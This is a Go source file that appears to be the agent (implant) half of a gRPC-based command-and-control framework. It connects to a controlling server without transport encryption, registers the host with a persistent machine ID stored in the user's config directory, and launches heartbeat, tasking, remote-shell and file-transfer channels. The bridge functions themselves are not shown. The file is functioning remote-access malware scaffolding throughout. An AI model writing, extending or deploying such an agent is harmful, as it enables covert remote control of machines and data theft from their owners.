package main

import (
	"context"
	"errors"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	pb "github.com/ardhptr21/c2-grpc/pb"
	"github.com/google/uuid"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/status"
)

func runAgentSession(ctx context.Context, serverAddr, hostname, machineID string) error {
	dialCtx, cancelDial := context.WithTimeout(ctx, 5*time.Second)
	defer cancelDial()

	conn, err := grpc.DialContext(
		dialCtx,
		serverAddr,
		grpc.WithTransportCredentials(insecure.NewCredentials()),
		grpc.WithBlock(),
	)
	if err != nil {
		return fmt.Errorf("connect error: %w", err)
	}
	defer conn.Close()

	agentServiceClient := pb.NewAgentServiceClient(conn)
	heartbeatClient := pb.NewHeartbeatServiceClient(conn)
	taskClient := pb.NewTaskServiceClient(conn)
	outputServiceClient := pb.NewOutputServiceClient(conn)
	shellClient := pb.NewShellServiceClient(conn)
	fileClient := pb.NewFileServiceClient(conn)

	registerCtx, cancelRegister := context.WithTimeout(ctx, 5*time.Second)
	defer cancelRegister()

	reg, err := agentServiceClient.Register(registerCtx, &pb.RegisterRequest{
		Hostname:  hostname,
		Os:        runtime.GOOS,
		Ip:        "127.0.0.1",
		MachineId: machineID,
	})
	if err != nil {
		if status.Code(err) == codes.AlreadyExists {
			return fmt.Errorf("%w: machine %q is already connected", errAgentAlreadyRegistered, machineID)
		}
		return fmt.Errorf("register error for host %q: %w", hostname, err)
	}

	sessionMu.Lock()
	agentID = reg.GetAgentId()
	agentClient = agentServiceClient
	outputClient = outputServiceClient
	sessionMu.Unlock()

	agentLog("[agent] %s", reg.GetMessage())
	defer clearSession()

	sessionCtx, cancelSession := context.WithCancelCause(ctx)
	defer cancelSession(nil)
	defer func() {
		if errors.Is(context.Cause(sessionCtx), context.Canceled) {
			unregisterCurrentAgent()
		}
	}()

	go startHeartbeat(sessionCtx, cancelSession, heartbeatClient, reg.GetAgentId())
	go startTaskListener(sessionCtx, cancelSession, taskClient, reg.GetAgentId())
	go startShellBridge(sessionCtx, cancelSession, shellClient, reg.GetAgentId())
	go startFileBridge(sessionCtx, cancelSession, fileClient, reg.GetAgentId())

	<-sessionCtx.Done()
	cause := context.Cause(sessionCtx)
	if cause == nil || errors.Is(cause, context.Canceled) {
		return nil
	}
	return cause
}

func currentSession() (string, pb.AgentServiceClient, pb.OutputServiceClient) {
	sessionMu.RLock()
	defer sessionMu.RUnlock()
	return agentID, agentClient, outputClient
}

func clearSession() {
	sessionMu.Lock()
	defer sessionMu.Unlock()
	agentID = ""
	agentClient = nil
	outputClient = nil
}

func unregisterCurrentAgent() {
	agentID, agentClient, _ := currentSession()
	if agentID == "" || agentClient == nil {
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	if _, err := agentClient.Unregister(ctx, &pb.UnregisterRequest{AgentId: agentID}); err != nil {
		log.Printf("[agent] unregister error: %v", err)
		return
	}

	clearSession()
}

func ensureMachineID() (string, error) {
	path, err := machineIDPath()
	if err != nil {
		return "", err
	}

	data, err := os.ReadFile(path)
	if err == nil {
		id := strings.TrimSpace(string(data))
		if id != "" {
			return id, nil
		}
	}
	if err != nil && !errors.Is(err, os.ErrNotExist) {
		return "", err
	}

	id := uuid.NewString()
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		return "", err
	}
	if err := os.WriteFile(path, []byte(id+"\n"), 0o600); err != nil {
		return "", err
	}
	return id, nil
}

func machineIDPath() (string, error) {
	configDir, err := os.UserConfigDir()
	if err == nil && configDir != "" {
		return filepath.Join(configDir, "c2-grpc", "agent-id"), nil
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(homeDir, ".c2-grpc-agent-id"), nil
}

func configureLogging(logFile string) {
	if logFile == "" {
		return
	}

	f, err := os.OpenFile(logFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		log.Fatalf("open log file: %v", err)
	}
	log.SetOutput(f)
}

func agentLog(format string, args ...any) {
	if headlessMode {
		log.Printf(format, args...)
		return
	}
	fmt.Printf(format+"\n", args...)
}
